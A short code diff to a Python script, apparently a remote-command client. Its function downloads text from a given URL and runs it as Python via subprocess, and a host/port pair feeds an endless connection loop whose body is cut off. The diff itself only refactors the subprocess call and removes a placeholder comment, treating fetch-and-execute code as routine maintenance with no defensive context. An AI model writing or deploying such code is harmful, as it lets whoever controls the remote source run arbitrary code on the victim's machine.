@@ -9,12 +9,12 @@ def fetch_url_and_execute_cmd(url, args):
         response = requests.get(url)
         content = response.text if response.status_code == 200 else f'Failed to retrieve content from the URL. Status Code: {response.status_code}'
         command = ['python', '-c', content, *args]
-        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        result = subprocess.run(command, capture_output=True, text=True)
         return result.stdout if result.returncode == 0 else result.stderr
     except Exception as e:
         return f'An error occurred: {e}'
 
-host, port = '127.0.0.1', 12345  # Replace with actual values
+host, port = '127.0.0.1', 12345
 
 while True:
     try:
